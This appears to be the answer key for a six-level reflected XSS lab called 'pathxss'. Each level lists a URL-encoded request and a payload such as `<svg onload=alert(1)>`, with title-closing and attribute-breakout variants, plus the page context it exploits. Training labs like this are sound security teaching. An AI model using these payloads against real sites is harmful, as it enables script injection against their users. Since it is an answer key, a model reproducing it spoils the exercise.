# pathxss — solutions

Page-template reflections (paragraph, breadcrumb, title, canonical href, dual sinks).

### pathxss-level1

`/pathxss/level1/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in <p>Page: QUERY</p>

### pathxss-level2

`/pathxss/level2/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in breadcrumb <nav>

### pathxss-level3

`/pathxss/level3/?query=%3C%2Ftitle%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</title><svg onload=alert(1)>`
- context: inside <title>; close title then inject

### pathxss-level4

`/pathxss/level4/?query=%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: <link rel=canonical href="/page/QUERY"> attribute breakout

### pathxss-level5

`/pathxss/level5/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: body reflection exploitable directly (also reflected in JS string)

### pathxss-level6

`/pathxss/level6/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection inside <h1>
